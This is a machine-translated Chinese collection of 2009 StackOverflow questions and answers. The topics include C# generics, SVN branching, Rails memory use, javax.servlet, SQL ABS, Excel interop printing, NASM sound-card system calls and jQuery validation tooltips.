# StackOverflow 问答 000860000-000860999

# python - 是否有与 Java 的 AWT Robot 类等效的 Python？

> ID：860013
> 
> 赞同：12
> 
> 时间：2009-05-13T19:43:47.653
> 
> 标签：python, linux, automation, screenshot, awtrobot

有谁知道类似于[Java Robot](http://java.sun.com/javase/6/docs/api/java/awt/Robot.html)的 Python 类？

具体来说，我想在 Ubuntu 中执行屏幕抓取，并最终跟踪鼠标点击和键盘按下（尽管这是一个稍微不同的问题）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-05-13T20:57:27.410

如果您有 GTK，那么您可以使用[gtk.gdk.Display](http://www.pygtk.org/docs/pygtk/class-gdkdisplay.html)类来完成大部分工作。它控制键盘/鼠标指针抓取一组`gtk.gdk.Screen`对象。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-13T21:43:50.423

查看[GNU LDTP](http://ldtp.freedesktop.org/wiki/)：

> GNU/Linux 桌面测试项目 (GNU LDTP) 旨在产生高质量的测试自动化框架 [...]

尤其是[用 Python 脚本语言编写 LDTP 测试脚本](http://ldtp.freedesktop.org/wiki/LDTP_test_scripts_in_python)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T20:09:06.943

至于屏幕抓取，请参阅[此答案](https://stackoverflow.com/questions/69645/take-a-screenshot-via-a-python-script-linux/782768#782768)。这对我有用。对同一问题的其他答案也可能很有趣。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-05-13T23:53:52.537

查看[RobotFramework](http://code.google.com/p/robotframework/)。我不知道它是否会做与 JavaRobot 相同的事情，或者它是否会做更多事情。但它使用起来很容易且非常灵活。

# c# - 返回嵌套的泛型表达式 >

> ID：860014
> 
> 赞同：7
> 
> 时间：2009-05-13T19:43:56.127
> 
> 标签：c#, .net, linq, lambda

错误消息是“找不到类型或命名空间名称 'T'。”

？？？

```
public static Expression<Func<T, bool>> MakeFilter(string prop, object val)
{
    ParameterExpression pe = Expression.Parameter(typeof(T), "p");
    PropertyInfo pi = typeof(T).GetProperty(prop);
    MemberExpression me = Expression.MakeMemberAccess(pe, pi);
    ConstantExpression ce = Expression.Constant(val);
    BinaryExpression be = Expression.Equal(me, ce);
    return Expression.Lambda<Func<T, bool>>(be, pe);
} 
```

相关链接：

[使用反射来处理 Linqed 属性](https://stackoverflow.com/questions/791187/using-reflection-to-address-a-linqed-property)

[http://social.msdn.microsoft.com/forums/en-US/linqprojectgeneral/thread/df9dba6e-4615-478d-9d8a-9fd80c941ea2/](http://social.msdn.microsoft.com/forums/en-US/linqprojectgeneral/thread/df9dba6e-4615-478d-9d8a-9fd80c941ea2/)

[通用 Func<T> 的运行时创建](https://stackoverflow.com/questions/658316/runtime-creation-of-generic-funct)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-05-13T19:47:22.890

您需要使方法本身通用：

```
public static Expression<Func<T, bool>> MakeFilter<T>(string prop, object val)
                                                  -+-
                                                   ^
                                                   +- this 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-13T19:45:30.897

没有为您的方法定义通用参数。您应该定义一个 ( `MakeFilter<T>`)：

```
public static Expression<Func<T, bool>> MakeFilter<T>(string prop, object val)
{
    ParameterExpression pe = Expression.Parameter(typeof(T), "p");
    PropertyInfo pi = typeof(T).GetProperty(prop);
    MemberExpression me = Expression.MakeMemberAccess(pe, pi);
    ConstantExpression ce = Expression.Constant(val);
    BinaryExpression be = Expression.Equal(me, ce);
    return Expression.Lambda<Func<T, bool>>(be, pe);
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T19:46:15.233

该方法需要声明为泛型 ( `MakeFilter<T>`)：

```
public static Expression<Func<T, bool>> MakeFilter<T>(string prop, object val) 
```

否则，调用者将如何指定是什么`T`？

# language-agnostic - 多个项目的版本控制最佳实践

> ID：860016
> 
> 赞同：8
> 
> 时间：2009-05-13T19:44:01.413
> 
> 标签：language-agnostic, version-control

我有几个项目具有非常大的重叠代码库。我们最近才开始使用 SVN，所以我想弄清楚我应该如何使用它。

问题是当我完成一个项目的任务时，我正在另一个项目上开始任务，有一些重叠。通常也有很多中断驱动的开发。所以，我的代码从来没有真正处于完全稳定的状态，我感觉很舒服。

结果是我们并没有真正使用VC系统，这是一件非常糟糕的事情，我们都知道......所以，建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T19:49:53.120

查看代码的个人分支并合并更改。至少您将对自己的更改进行一些版本控制，以防您需要回滚。一旦您对分支所处的状态感到满意，将该分支合并回主干。

您还可以为每个任务签出一个分支，而不是为每个人签出一个。如果有人更改了主干，并且您希望您的分支反映更改，您还可以从主干合并更改到您的分支。

这是使用 SVN 的常用方法，尽管还有其他工作流程。我从事过一些我不敢提交的项目（我可能会破坏构建），因为我们没有有效地使用分支。

分支在帮助您的工作流程方面非常强大，使用它直到您对合并的想法感到满意为止。

编辑：“签出分支”是指在您的分支文件夹中创建分支，然后签出该分支。标准的 svn 存储库结构由根目录下的文件夹trunk、标签和分支组成。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T20:03:13.020

> 所以，我的代码从来没有真正处于完全稳定的状态，我感觉很舒服。

这是为什么 ？
如果您的分支适合您的工作（例如具有良好的命名约定），每个人都会知道它的 HEAD 并不总是稳定的。
在这种“工作”分支中，只需沿途放置一些标签以指示一些“稳定的代码点”（然后可以由任何要部署的测试人员查询）。
该工作分支上的任何其他版本都只是为了记录更改，即使当前状态不稳定。

然后稍后您将所有内容合并到一个应该代表稳定状态的分支上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T19:56:29.677

在 TFS 中，您可以创建“货架集”（我不确定在其他源代码控制提供程序中它们会被称为什么）。当您搁置一些代码时，您将其保存到您的存储库中，但没有将其签入。

这很重要的原因是，如果您正在处理 Bug XXXX，并且您修复了一半的代码，但它不稳定并且不能“签入”，但是您被分配到 NewFeature YYYY，您不应该继续工作具有相同的代码库。您应该“搁置”您的 Bug XXXX 代码，然后将您的本地代码库返回到最新的签入代码，并实施 NewFeature YYYY。

这样，您就可以保持签到的原子性。您不必担心丢失您的工作，因为它仍然由存储库保存（因此，如果您的计算机起火，您不必哭泣），并且您没有混合 XXXX 的修复程序使用您的 YYYY 新代码。然后，一旦您被要求返回 XXXX（假设您已签入 YYYY），您就可以取消搁置您的“架子集”并直接跳回您离开的地方。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-13T19:56:39.863

要么接受 SVN 中的代码不是处于完全稳定的状态，然后无论如何都要检查它（并每隔 X 天/周预留时间进行稳定和重构，这样代码就不会降级太多）。

或者强迫您的团队以更结构化的方式工作，并尽量减少基于中断的开发，这样您就可以签入好的代码。

第一个选项并不理想（但比没有源代码控制更好），第二个可能是不可能的 - 没有第三个选项。

如果您没有时间让代码进入稳定状态，那么您肯定没有时间一直进行分支和合并。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T20:10:47.330

在像 GIT 这样的分布式源代码控制系统中，您提交到本地存储库。只有当您推送代码时，它才会“提交”到远程存储库。

通过这种方式，更容易在两者之间“保护”您的工作。

# ruby-on-rails - 减少 Mongrel Rails 内存占用并提高性能？

> ID：860018
> 
> 赞同：6
> 
> 时间：2009-05-13T19:45:03.440
> 
> 标签：ruby-on-rails, jruby, mongrel, memory-footprint

我的 Rails 站点运行 Mongrel，我遇到了正在使用的内存量的问题。我的 ruby​​-bin 进程正在使用大约 66 MB 的常驻内存。如何减少 Rails 使用的内存量？

如果多个 Rails 服务器以这种速度消耗内存，那么在一台机器上运行多个 Rails 服务器不是很经济。我的 php5 fcgi 进程位于 15-25 MB 之间。

我对 RoR 相当不熟悉，使用 JRuby 会有帮助吗？任何有助于减少内存占用和提高性能的评论都非常受欢迎。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-05-13T19:51:26.190

您可能会查看[Phusion Passenger](http://www.modrails.com/)和[Ruby Enterprise Edition](http://www.rubyenterpriseedition.com/)，这是目前 Rails 应用程序事实上的标准设置。它的目标之一是减少内存使用。这也比拥有一堆杂种更简单。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-13T20:59:44.597

如果您不依赖 apache 做其他事情，我也会尝试使用 Phusion Passenger 的 nginx。如果您担心内存使用情况，您应该会看到 nginx 的占用空间比 apache 小，并且最新版本的 Passenger 将为您下载、编译和安装 nginx，而不会让人头疼。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-05-14T11:48:01.850

[你也可以用更高效的Thin](http://code.macournoyer.com/thin/)替换你的 mongrel 进程，它最近在其垃圾收集（通过 eventmachine）中进行了修补，以使其更好。

我们在 nginx 前端后面使用瘦集群，效果很好。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-14T07:33:58.060

我不会说乘客是事实上的标准，但它正在获得很大的吸引力。我们刚刚切换到 Nginx+Passenger，我们的 ruby​​ 应用程序（即 Mongrels vs.Passenger）内存占用从大约 450MB 下降到 295MB。它可以减少更少，因为如果乘客空闲（这是可配置的），Passenger 会杀死 procs，但当然，如果你正在获得流量并且它正在使用你配置的所有实例，那么它们会相应地用完内存.

请注意，我们还没有在我们的配置中使用 Ruby 企业版（主要是因为它在 Engine Yard 上还没有），但我们仍然看到较小的内存占用。内存是我们进行切换的最初首要原因，但还有其他好处，例如更快、更轻松地进行扩展或缩减配置等。

# drupal - 如何在 Drupal 6 中验证自定义节点表单中的节点引用字段？

> ID：860019
> 
> 赞同：0
> 
> 时间：2009-05-13T19:45:12.520
> 
> 标签：drupal, validation

我在自定义 pass-node-form.tpl.php 中有一个自动完成节点引用字段 (field_hostnamelastref)。该字段引用从另一个内容类型的自动标题中的标记生成的四个项目（姓氏、名字、id # 和状态）。

在节点引用字段中输入姓氏时，如果该姓氏的相应状态为“暂停”，我希望能够使用错误消息验证该字段并阻止表单提交。

这是我第一次尝试编写自己的验证并且没有任何运气。尝试了许多不同的方法 ereg、preg-match 和 strpos。以下是我的最新尝试：

```
<?php
  function pass_validate($form_id,$form_values) {
    $status = 'SUSPENDED';
    if (strpos ($form_values['hostnamelastref'], $status)) {
      form_set_error('hostnamelastref', t('The account for this person has been suspended.', array('@type' => $type->name)));
    }
  }
?> 
```

不确定我是否在球场上。非常感谢任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-18T13:20:58.693

如果您可以以某种方式将 SUSPENDED 信息传递给视图，那么您可以使用视图限制在节点引用中选择的节点。如果用户输入的节点不在列表中，则 nodereference 将负责验证。

但我不确定我是否理解你的问题。

# java - javax.servlet 在哪里？

> ID：860022
> 
> 赞同：56
> 
> 时间：2009-05-13T19:45:42.940
> 
> 标签：java, servlets

我已经`jdk1.6.0_13`安装了，但是当我试图找到一个`javax.servlet`包，或者在我无法得到任何东西之后在 Eclipse 中按`Ctrl`+时。我在哪里可以下载这个包，为什么它没有包含在开发人员的标准分发中？`Space``Servlet`

* * *

## 回答 #1

> 赞同：90
> 
> 时间：2009-05-13T19:49:22.140

`javax.servlet`是一个包，它是 Java EE（Java 企业版）的一部分。您已经获得了 Java SE（Java 标准版）的 JDK。

例如，您可以使用[Java EE SDK](http://java.sun.com/javaee/downloads/?intcmp=1282)。

或者，简单的 servlet 容器（例如[Apache Tomcat](http://tomcat.apache.org/) ）也带有这个 API（查找`servlet-api.jar`）。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-02-21T17:14:10.110

Joachim Sauer 的回答更详细一点：

至少在 Ubuntu 上，元包`tomcat6`依赖于元包`tomcat6-common`（和其他），元包依赖于元包`libtomcat6-java`，元包依赖于包**`libservlet2.5-java`**（和其他）。其中包含文件`/usr/share/java/servlet-api-2.5.jar`和`/usr/share/java/jsp-api-2.1.jar`，它们是您需要的 servlet 和 JSP 库。因此，如果您已经通过 apt-get 或 Ubuntu 软件中心安装了 Tomcat 6，那么您已经拥有了这些库；剩下的就是让 Tomcat 在您的项目中使用它们。

像这样放置库`/usr/share/java/servlet-api-2.5.jar`和`/usr/share/java/jsp-api-2.1.jar`类路径：

*   对于所有项目，通过选择 Window -> Preferences -> Java -> Installed JREs 来配置 Eclipse，然后选择您正在使用的 JRE，按 Edit，然后按 Add External JARs，然后从上面给出的位置选择文件.

*   对于一个项目，右键单击 Project Explorer 窗格中的项目，然后选择 Properties -> Java Build Path，然后按 Add External JARs，然后从上面给出的位置选择文件。

进一步说明 1：这些是用于 Tomcat 6 的这些库的正确版本；对于其他 Tomcat 版本，请参阅页面[http://tomcat.apache.org/whichversion.html](http://tomcat.apache.org/whichversion.html)上的表格，尽管我认为每个 Tomcat 版本都包含适合它的这些库的版本。

进一步说明 2：Package`libservlet2.5-java`的描述 ( `dpkg-query -s libservlet2.5-java`) 说：'Apache Tomcat 实现了Sun Microsystems 的**Java Servlet 和 JavaServer Pages (JSP)**规范，并为 Java 代码运行提供了一个“纯 Java”HTTP Web 服务器环境。这个包包含 Java Servlet 和 JSP 库。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-05-13T19:48:08.567

你安装了[J2EE](http://java.sun.com/javaee/)吗？如果您只安装了标准（J2SE），它将找不到。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2010-05-24T15:07:36.277

使用 Eclipse 和 Java EE Web 应用程序的正常过程是安装 servlet 容器（Tomcat、Jetty 等）或应用程序服务器（Glassfish（捆绑在“Sun Java EE”下载中）、JBoss AS、WebSphere、Weblogic 等）并使用*服务器*视图中的（内置）插件将其集成到 Eclipse 中。

*在新动态 Web 项目*的创建向导期间，您可以从列表中选择集成服务器。如果您碰巧有一个没有服务器的现有*动态 Web 项目*或想要更改关联的，那么您需要在项目属性的*Targeted Rutimes*部分中对其进行修改。

无论哪种方式，Eclipse 都会自动将必要的特定于服务器的库放置在项目的类路径（构建路径）中。

您绝对**不**应该将特定于服务器的库提取并复制到您自己中，`/WEB-INF/lib`甚至更糟糕的是`JRE/lib`，以“修复”Eclipse 中的编译错误。它会使你的 web 应用程序绑定到特定的服务器，因此完全不可移植。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-10-10T07:05:53.137

如果您有带有 Glassfish 的 Java EE JDK，它位于 glassfish3/glassfish/modules/javax.servlet-api.jar 中。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T20:42:46.857

这些类通常是 servlet.jar
[http://www.java2s.com/Code/Jar/wsit/Downloadservletjar.htm的一部分](http://www.java2s.com/Code/Jar/wsit/Downloadservletjar.htm)

# ssis - SSIS 输出到平面文件为 0.00

> ID：860023
> 
> 赞同：1
> 
> 时间：2009-05-13T19:45:56.840
> 
> 标签：ssis

在 SSIS 中，我的 OLE DB 源中有一个 MONEY 列，格式为 0.00。我想以完全相同的格式将此值输出到平面文件。到目前为止，我找到了两种解决方案：

1.  将其转换为我的源中的字符串并将字符串输出到文件中。由于这是一个平面文件，它并不关心我是如何达到 0.00 的。它只是将其用作值。

2.  使用数据流中的派生列生成 0.00 的字符串。这只是实现第一个解决方案的一种更难的方法，但它可以在我无法控制源数据格式的情况下工作。

我不太喜欢这两种解决方案，因为它需要一些额外的工作才能正确地将格式强制为字符串。如果我将数据流源输出列更改为 Numeric(18,2)，我可以让数据输出为 .00，但这并不能完全解决问题。 **有没有办法在不将数据转换为字符串的情况下输出 0.00？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-15T20:06:04.937

使用 ABS() 正则表达式。它保持数字并产生您想要的“0.00”。

```
ABS(numeric_expression) 
```

** 看数学正则表达式。如果您的源数据中有负值，则 ABS 可能不是您想要的。

# sql - 从 SUM 列中删除“-”

> ID：860024
> 
> 赞同：0
> 
> 时间：2009-05-13T19:45:59.447
> 
> 标签：sql

组，对于某些记录号，我需要从列中的任何负数中删除“-”。但是 Sum 需要 * by .01 才能获得正确的格式。我尝试使用替换，但它被 *.01 抛弃了下面是我的语法。

```
CASE WHEN SUM(ExtPrice) *.01 < 0 AND RecordNum BETWEEN 4000 AND 5999 
        THEN REPLACE(SUM(ExtPrice) *.01,'-','')
     ELSE SUM(ExtPrice) *.01 
END AS Totals 
```

例如`SUM(ExtPrice) *.01` ，在一列中给了我 -5051.32 但是当我使用上面的 case 语句时，我得到 5050 另一个示例 -312.67 并且我使用 case 得到 310。非常感谢任何建议或更好的方法来做到这一点。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-05-13T19:49:46.037

您可以使用 ABS 函数来获取数字的正值。例如：

```
ABS(-123.445) /* this equals 123.445 */ 
```

因此，您可以将 CASE 语句替换为：

```
CASE WHEN SUM(ExtPrice) < 0 AND RecordNum BETWEEN 4000 AND 5999         
         THEN ABS(SUM(ExtPrice) *.01)     
     ELSE SUM(ExtPrice) *.01 
END AS Totals 
```

# c# - 使用 Excel 互操作并获取打印对话框

> ID：860027
> 
> 赞同：3
> 
> 时间：2009-05-13T19:46:18.417
> 
> 标签：c#, interop, printing

我有以下代码：[谢谢 Mike Rosenblum！]

使用系统；使用 System.Collections.Generic；使用 System.Linq；使用 System.Text；使用 Microsoft.Office.Interop.Excel；使用 System.Runtime.InteropServices；

命名空间 ConsoleApplication17 { 类程序 {

```
 static void Main(string[] args) {

    //public void PrintMyExcelFile() 
    //{
Microsoft.Office.Interop.Excel.Application excelApp = new Microsoft.Office.Interop.Excel.Application();

// Open the Workbook:
Microsoft.Office.Interop.Excel.Workbook wb = excelApp.Workbooks.Open(
    @"C:\hello.xls",
    Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, 
    Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, 
    Type.Missing, Type.Missing,Type.Missing,Type.Missing);

// Get the first worksheet.
// (Excel uses base 1 indexing, not base 0.)
Microsoft.Office.Interop.Excel.Worksheet ws = (Microsoft.Office.Interop.Excel.Worksheet)wb.Worksheets[1];

// Print out 1 copy to the default printer:
ws.PrintOut(
    Type.Missing, Type.Missing, Type.Missing, Type.Missing, 
    Type.Missing, Type.Missing, Type.Missing, Type.Missing);

// Cleanup:
GC.Collect();
GC.WaitForPendingFinalizers();

Marshal.FinalReleaseComObject(ws);

wb.Close(false, Type.Missing, Type.Missing);
Marshal.FinalReleaseComObject(wb);

excelApp.Quit();
Marshal.FinalReleaseComObject(excelApp);

}
    }

    } 
```

我想要完成的是，我不想立即打印我的 excel 文件，而是希望出现一个打印对话框，以便我可以根据需要选择特定的打印机。
我正在为 Excel 使用 12.0.0.0 .NET 互操作。有人有什么想法吗？

提前致谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-05-13T19:52:55.113

打印对话框可以从 .NET 访问，并且可以使用 12.0 PIA 在 Excel 2007 上正常运行。然而，Dialog.Show() 命令有 30 个可选参数。将来，C# 4.0 将允许省略可选参数（谢天谢地），VB.NET 不需要它们，但如果使用 C# 3.0 或更低版本，我们必须为可选参数提供 Type.Missing。全部 30 个：

```
bool userDidntCancel =
    excelApp.Dialogs[Excel.XlBuiltInDialog.xlDialogPrint].Show(
        Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
        Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
        Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
        Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
        Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
        Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing); 
```

Show()方法返回'true'表示操作成功；它返回 'false' 表示用户点击了取消按钮或退出 (esc) 键，因此没有发生任何操作。

希望这能让你继续...

# crystal-reports - Crystal Reports 基于参数的 if-then-else 选择

> ID：860030
> 
> 赞同：1
> 
> 时间：2009-05-13T19:46:42.893
> 
> 标签：crystal-reports

我有这个水晶报表，我希望能够用它来显示表格中的每个人，或者只显示欠钱的人。

该参数称为 displayAll 并且是一个布尔值。基本上我想要这个

```
if displayAll Then
   Show every person
else
   Show only When Balance is below 0 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T19:49:38.380

在您的记录选择公式中，可以这样说：

```
If {?DisplayAll} Then
    True
Else
    {Data.Balance} < 0; 
```

# nasm - 如何使用nasm访问linux中的声卡

> ID：860031
> 
> 赞同：0
> 
> 时间：2009-05-13T19:47:06.200
> 
> 标签：nasm

您好，我想知道如何使用 int 0x80 从 nasm 汇编程序访问声卡。以及访问声卡时我应该在寄存器中输入什么值。

是否有任何手册或有关我们必须传递给内核以访问声卡或其他硬件设备的参数的详细信息，如果有人知道，请告诉我。

我已经做了很多搜索，并且有很多 c 库和 ALSA 和 OSS 之类的东西，但我想要的是，如果有人知道一些关于从基础开始学习有关与硬件接口的汇编程序的资源。

如果有人能给我一个关于如何访问的小代码清单，我将非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T19:55:09.837

这就是声卡驱动程序所做的。它们必须为每个声卡定制编写，以实现可由操作系统或应用程序使用的通用 API。其他硬件设备也是如此。硬件制造商对于如何在这个级别访问他们的东西往往不太开放（一方面）。

并不是说我是 Linux 专家，但这是所有操作系统的一个相当基本的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-15T04:30:39.333

如您所见，Linux 中用户空间和内核空间之间的接口是 INT 0x80。

在 Unix 中，作为哲学问题，（几乎）一切都是文件，因此声卡被视为“字符文件”。内核系统调用符合 POSIX 规范 - 所以“open”、“close”、“ioctl”、“read”、“write”。

对声卡的访问是通过驱动程序接口完成的，作为“/dev/”下的文件。一些示例文档位于[OSS 文档](http://manuals.opensound.com/developer/)中，但我不确定它是否是最新的。

要观察这种通信，您可以使用“strace”来查看任何现有应用程序正在使用哪些系统调用。

您可能会看到如下序列：

```
     打开（“/dev/dsp”，...）
     ioctl()
     写（）
     ...
     写（）
     关闭（）

```

通常你会通过 C 库“打开”，但由于你想跳过它，你可以通过几种方法找到系统调用——一种方法是

```
      objdump -d /usr/lib/libc.a

```

例如，你可以通过查找< `__libc_`open>发现open是syscall 0x5：你会注意到eax是5，其余参数在ebx、ecx和edx中。[（ Linux Syscalls](http://bluemaster.iu.hio.no/edu/ca/lin-asm/syscalls.html)上也列出了用法和参数）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T19:54:13.393

在用户模式下，这将不起作用 - 您将无法直接访问声音硬件。

如果您创建内核模式驱动程序，您可以直接戳声卡硬件，但在这一点上，我认为大多数供应商都有不同的实现，并且没有遵循一致的标准。较新的声卡可能仍与 Adlib 和 SoundBlaster 16 兼容——这是当游戏以 DOS 为目标并直接使用硬件时的硬件标准*，*但如果这不再有效，我不会感到惊讶。快速搜索应该会产生直接访问这些旧卡界面的方法。或者，您可以在虚拟机内部运行 DOS 并访问硬件 - 大多数虚拟机模拟此级别的声卡。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-15T05:15:22.907

根据您要执行的操作，您最好使用现有的库来处理声卡的接口，除非您打算编写声卡驱动程序，我对此表示怀疑，最好在 C 中完成在 Linux 上。

[Portaudio](http://www.portaudio.com/)是一款（免费）相对容易使用的。[一个使用带有 C 接口的 portaudio 的示例库（我是 wwviaudio 的作者）](http://ccan.ozlabs.org/info/wwviaudio.html)。

[FMOD](http://www.fmod.org/)似乎对游戏编程人员来说很重要，尽管它不是免费的。

[sdl 混音器](http://www.libsdl.org/projects/SDL_mixer/)是另一个对 linux 游戏开发者来说很重要的混音器。

[JACK](http://jackaudio.org/)在 linux 专业音频领域非常重要。（想想热情——Linux 对 Protools 的回答。）

尝试直接从用户空间与音频硬件对话是没有意义的。

# java - 如何以 PHP 和 Rails 的风格将请求参数获取到 Java 中的数组？

> ID：860041
> 
> 赞同：4
> 
> 时间：2009-05-13T19:48:56.210
> 
> 标签：java, parameters, request

情况如下：

```
page.jsp?var[0]=foo&var[1]=bar 
```

如何在 Java 中的数组中检索它？

以下：

```
page.jsp?var=foo&var=bar 
```

我知道可以使用 request.getParameterValues("var") 检索

上述任何解决方案吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T21:41:36.370

```
HashMap m = request.getParameterMap();
Set k = m.keySet();
Set v = m.entrySet();
Object o[] = m.entrySet().toArray(); 
```

这将为您提供带有 K、V 对以及一组键和一组值的 Map 调用 m。您几乎可以像数组一样迭代这些集合。您也可以使用 toArray 将其转换为数组。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-05-13T22:14:17.830

```
Map<Integer,String> index2value=new HashMap<Integer,String>();

for (Enumeration e = request.getParameterNames(); e.hasMoreElements() ;)
 {
 String param= e.nextElement().toString();
 if(!param.matches("var\[[0-9]+\]")) continue;
 int index= (here extract the numerical value....)
 index2value.put(index,request.getParameter(param));
 } 
```

希望这可以帮助。

# nhibernate - 在 Web 应用程序中查询 NHibernate 以进行分页

> ID：860045
> 
> 赞同：1
> 
> 时间：2009-05-13T19:49:24.150
> 
> 标签：nhibernate

例如，给定一个查询：

```
from Users u where u.Country = "US" 
```

我有一个带有自定义网格的网络应用程序。

如何查询 NHibernate 以返回给定页面大小和索引的特定页面结果？？？

马尔科姆

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T20:06:08.350

在查询或条件上使用 SetFirstResult 和 SetMaxResults：

```
int pagesize = 10;
int page = 2;
query = session.createQuery("...")
  .SetFirstResult(pagesize * page)
  .SetMaxResults(pagesize); 
```

# jquery - jQuery覆盖默认验证错误消息显示（Css）Popup/Tooltip之类

> ID：860055
> 
> 赞同：70
> 
> 时间：2009-05-13T19:50:43.667
> 
> 标签：jquery, css, popup, tooltip, custom-errors

我正在尝试使用 div 而不是标签来覆盖默认的错误消息标签。我也看过[这篇文章](https://stackoverflow.com/questions/309574/jquery-validation-how-to-not-display-errors-or-how-to-display-errors-as-a-toolt)并知道如何去做，但我对 CSS 的限制一直困扰着我。我怎样才能像其中一些示例一样显示它：

[Example #1 (Dojo)](http://www.dojotoolkit.org/book/dojo-book-0-9/part-2-dijit/form-validation-specialized-input/textbox-validating-currency-number) - 必须输入无效输入才能看到错误显示
[Example #2](http://www.scriptiny.com/2008/04/dynamic-inline-javascript-form-validation/)

这是一些将错误标签覆盖到 div 元素的示例代码

```
$(document).ready(function(){
            $("#myForm").validate({
                rules: {
                    "elem.1": {
                        required: true,
                        digits: true
                    },
                    "elem.2": {
                        required: true
                    }
                },
                errorElement: "div"
            });                  
        }); 
```

现在我在css部分不知所措，但这里是：

```
div.error {
        position:absolute;
        margin-top:-21px;
     margin-left:150px;
     border:2px solid #C0C097;
        background-color:#fff;
        color:white;
        padding:3px;
        text-align:left;
        z-index:1;
        color:#333333;
     font:100% arial,helvetica,clean,sans-serif;
     font-size:15px;
     font-weight:bold;  
    } 
```

更新：

好的，我现在正在使用此代码，但是弹出窗口上的图像和位置大于边框，可以将其调整为动态高度吗？

```
if (element.attr('type') == 'radio' || element.attr('type') == 'checkbox') {
   element = element.parent();

   offset = element.offset();
   error.insertBefore(element)
   error.addClass('message');  // add a class to the wrapper
   error.css('position', 'absolute');
   error.css('left', offset.left + element.outerWidth());
   error.css('top', offset.top - (element.height() / 2)); // Not working for Radio, displays towards the bottom of the element. also need to test with checkbox
} else {
   // Error placement for single elements
   offset = element.offset();
   error.insertBefore(element)
   error.addClass('message');  // add a class to the wrapper
   error.css('position', 'absolute');
   error.css('left', offset.left + element.outerWidth());
   error.css('top', offset.top - (element.height() / 2));
} 
```

CSS与以下相同（您的CSS代码）

html

```
<span>
<input type="radio" class="checkbox" value="P" id="radio_P" name="radio_group_name"/>
<label for="radio_P">P</label>
<input type="radio" class="checkbox" value="S" id="radio_S" name="radio_group_name"/>
<label for="radio_S">S</label>
</span> 
```

* * *

## 回答 #1

> 赞同：187
> 
> 时间：2009-05-16T21:55:02.717

您可以使用[errorPlacement](http://docs.jquery.com/Plugins/Validation/validate#toptions)选项用很少的 css 覆盖错误消息显示。因为 css 本身不足以产生您需要的效果。

```
$(document).ready(function(){
    $("#myForm").validate({
        rules: {
            "elem.1": {
                required: true,
                digits: true
            },
            "elem.2": {
                required: true
            }
        },
        errorElement: "div",
        wrapper: "div",  // a wrapper around the error message
        errorPlacement: function(error, element) {
            offset = element.offset();
            error.insertBefore(element)
            error.addClass('message');  // add a class to the wrapper
            error.css('position', 'absolute');
            error.css('left', offset.left + element.outerWidth());
            error.css('top', offset.top);
        }

    });
}); 
```

您可以使用 left 和 top css 属性来在元素的顶部、左侧、右侧或底部显示错误消息。例如在顶部显示错误：

```
 errorPlacement: function(error, element) {
        element.before(error);
        offset = element.offset();
        error.css('left', offset.left);
        error.css('top', offset.top - element.outerHeight());
    } 
```

等等。您可以参考[有关 css 的 jQuery 文档](http://docs.jquery.com/CSS)以获取更多选项。

这是我使用的css。结果看起来与您想要的完全一样。使用尽可能少的 CSS：

```
div.message{
    background: transparent url(msg_arrow.gif) no-repeat scroll left center;
    padding-left: 7px;
}

div.error{
    background-color:#F3E6E6;
    border-color: #924949;
    border-style: solid solid solid none;
    border-width: 2px;
    padding: 5px;
} 
```

这是您需要的背景图片：

[![替代文字](https://i.stack.imgur.com/GXa0s.gif)](https://i.stack.imgur.com/GXa0s.gif)
[（来源：[scriptiny.com](http://sandbox.scriptiny.com/messages/images/msg_arrow.gif)）]

如果您希望在一组选项或字段之后显示错误消息。然后将一个容器内的所有这些元素分组为“div”或“fieldset”。例如，为所有这些“组”添加一个特殊类。并将以下内容添加到 errorPlacement 函数的开头：

```
errorPlacement: function(error, element) {
    if (element.hasClass('group')){
        element = element.parent();
    }
    ...// continue as previously explained 
```

如果您只想处理特定情况，可以使用 attr 代替：

```
if (element.attr('type') == 'radio'){
    element = element.parent();
} 
```

这应该足以让错误消息显示在父元素旁边。

您可能需要将父元素的宽度更改为小于 100%。

* * *

